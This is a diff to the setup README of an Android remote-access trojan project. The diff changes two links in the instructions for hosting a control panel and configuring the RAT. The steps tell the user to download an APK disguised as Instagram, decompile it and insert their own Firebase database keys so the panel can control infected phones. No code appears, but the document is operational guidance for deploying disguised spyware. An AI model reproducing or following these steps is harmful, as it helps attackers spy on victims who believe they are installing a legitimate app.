@@ -78,10 +78,10 @@
  1. Also create a web app and copy the config of webapp.
    ### Panel Setup
  1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
- 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 15](https://github.com/Technical-Robot/AIRAVAT-GOLD-MIHRK/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L15) replace the config with your web app config which you have created on Step 6.
+ 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 15](./WEB%20PANEL/index.html#L15) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### Android RAT
- 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
+ 1. Download [Instagram.apk](./ANDROID%20APP/Instagram_src.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
